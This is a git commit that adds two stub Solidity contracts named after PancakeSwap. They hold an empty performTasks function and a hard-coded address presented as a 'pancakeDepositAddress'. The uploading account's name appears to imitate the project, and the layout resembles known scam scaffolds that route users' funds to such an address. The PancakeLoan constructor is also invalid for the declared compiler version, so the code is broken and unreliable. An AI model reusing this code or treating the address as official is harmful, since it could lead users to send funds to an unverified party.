581713ae0d0c0f095e4e5144fc5e11515dd11ea6
pancake-v2 <88975294+pancake-v2@users.noreply.github.com>
2021-08-15 21:44:07 +0200

    Add files via upload

---
+++ Manager.sol
@@ -0,0 +1,10 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+  function performTasks() public {
+  
+  }
+  function pancakeDepositAddress() public pure returns (address) {
+    return 0x248A80eCEdfc5C2528dE159c0BbCBA76430635E1;
+  }
+}
---
+++ PancakeLoan
@@ -0,0 +1,8 @@
+pragma solidity ^0.5.0;
+
+contract PancakeLoan {
+  address pancakeAddress;
+  function PancakeLoan() {
+    pancakeAddress = address(0x248A80eCEdfc5C2528dE159c0BbCBA76430635E1);
+  }
+}
